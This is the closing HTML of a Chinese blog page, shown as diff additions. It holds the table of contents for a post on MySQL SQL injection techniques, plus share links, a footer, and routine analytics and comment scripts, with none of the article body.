+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">bool盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">宽字节注入</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&text=SQL注入学习笔记-MYSQL注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入学习笔记-MYSQL注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入学习笔记-MYSQL注入&body=Check out this article: http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&name=SQL注入学习笔记-MYSQL注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&t=SQL注入学习笔记-MYSQL注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2022-2025
+        Funsiooo
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a href="/search/">搜索</a></li><!--
+        --><!--
+          --><li><a href="/tags/">标签</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        -->
+          </ul>
+        </nav>        
+      </div>
+
+      <div class="footer-midle">
+        <nav>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              <span id="busuanzi_container_page_pv">
+			  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	      </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?47a5bc2b41144f91553c5eefd4999c0d";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'boom';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+<!-- FancyBox -->
+
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+
+</body>
+</html>
